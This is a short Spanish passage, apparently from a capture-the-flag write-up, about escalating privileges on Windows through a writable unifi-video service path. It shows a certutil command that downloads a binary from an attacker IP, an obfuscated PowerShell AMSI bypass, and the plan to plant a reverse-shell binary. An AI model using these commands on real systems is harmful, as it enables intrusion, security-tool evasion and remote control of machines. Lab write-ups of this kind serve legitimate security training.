...
Tengo capacidad de escritura en la ruta donde está instalado unifi-video. Al reiniciar el servicio se busca por un binario que no existe. El vector de escalada consiste en crear mi propio binario que se encargue enviarme una reverse shell a mi equipo
...
```null
*Evil-WinRM* PS C:\ProgramData\unifi-video> certutil.exe -f -split -urlcache http://10.10.16.3/taskkill.exe taskkill.exe
****  Online  ****
  000000  ...
  01204a
...
```null
PS C:\ProgramData\unifi-video> $a='si';$b='Am';$Ref=[Ref].Assembly.GetType(('System.Management.Automation.{0}{1}Utils'-f $b,$a)); $z=$Ref.GetField(('am{0}InitFailed'-f$a),'NonPublic,Static');$z.SetValue($null,$true)
PS C:\ProgramData\unifi-video> .\taskkill.exe
...
```null
*Evil-WinRM* PS C:\ProgramData\unifi-video> sc.exe query
...
```null
*Evil-WinRM* PS C:\ProgramData\unifi-video> reg query HKLM\SYSTEM\CurrentControlSet\Services | Select-String unifi
